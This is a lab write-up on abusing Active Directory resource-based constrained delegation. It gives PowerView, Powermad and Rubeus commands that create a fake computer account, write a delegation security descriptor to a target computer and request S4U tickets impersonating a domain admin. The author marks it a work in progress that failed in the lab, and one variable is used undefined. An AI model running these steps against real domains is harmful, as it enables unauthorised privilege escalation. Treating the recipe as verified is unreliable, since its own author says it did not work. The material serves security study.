# AD Computer Object Take Over and Privileged Code Execution

{% hint style="warning" %}
**WIP - DO NOT TRUST**

I was not able to replicate this attack in my lab, so if you notice what I did wrong here in my setup or the attack steps, I would like to hear from you.
{% endhint %}

It's possible to gain code execution with elevated privileges on a computer if you have ownership privileges for the victim's computer AD object.

This lab is based on a video presented by [@wald0](https://twitter.com/_wald0?lang=en) - [https://www.youtube.com/watch?v=RUbADHcBLKg&feature=youtu.be](https://www.youtube.com/watch?v=RUbADHcBLKg&feature=youtu.be)

## Requirements

|  |  |
| :--- | :--- |
| Target computer | WS01 |
| Admins on target computer | spotless@offense.local |
| Fake computer name | FAKE01 |
| Fake computer SID | To be retrieved during the attack |
| Fake computer password | 123456 |
| Windows 2012 Domain Controller | DC01 |

Since the attack will entail creating new computer objects on the domain, let's check if users are allowed to add computers to the domain. By default, a domain member is usually allowed to add up to 10 computers to the domain. To check this, we can query the root domain object and look for property `ms-ds-machineaccountquota`

```csharp
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-20-49-58.png)

The attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:

```csharp
Get-DomainController
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-20-56-15.png)

Last thing to check - target computer object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:

```text
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-21-03-32.png)

This is the attribute the above command is referring to:

![](../../.gitbook/assets/screenshot-from-2019-03-26-21-08-47.png)

Let's now create a new computer object for our computer `FAKE01` \(as referenced earlier in the requirements table\):

```csharp
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-21-30-46.png)

Checking if the computer got created and noting its SID:

```csharp
Get-DomainComputer fake01
# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
```

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-25-11.png)

Create a new raw security descriptor for the FAKE01$ computer principal:

```csharp
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-26-41.png)

Applying the security descriptor bytes to the target WS01$ machine:

```csharp
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-38-54.png)

Reminder - we were able to write this because offense\Sandy belongs to security group offense\Operations, which has full control over the target computer WS01$:



![](../../.gitbook/assets/screenshot-from-2019-03-26-22-40-43.png)

If our user did not have required privileges, you could infer that from the verbose error message:

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-43-25.png)

Once the `msDS-AllowedToActOnBehalfOfOtherIdentitity` is set, it is visible here:

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-42-18.png)

Same can be seen this way:

```csharp
Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-41-34.png)

We can test if the security descriptor assigned to computer ws01 in `msds-allowedtoactonbehalfofotheridentity` attribute refers to the fake01$ machine:

```csharp
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
```

Note that the SID is referring to S-1-5-21-2552734371-813931464-1050690807-1154 which is the fake01$ machine's SID - exactly what it should be:

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-24-04.png)

Let's generate the RC4 hash of the password we set for the FAKE01 computer:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-46-25.png)

Once we have the hash, we can now attempt to execute the attack:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-45.png)

Unfortunately, in my labs, I was not able to replicate the attack even though according to the output of rubeus, all the required kerberos tickets were created successfully - I could not gain remote admin on the target system:

![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-57%20%281%29.png)

Once again, checking kerberos tickets on the system showed that I had a ticket for spotless who is a DA and the attack still did not work. If you are reading this and notice what I am doing wrong - I would like to hear from you!

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-01-23.png)

## References

{% embed url="https://github.com/Kevin-Robertson/Powermad" %}

{% embed url="https://github.com/PowerShellMafia/PowerSploit" %}




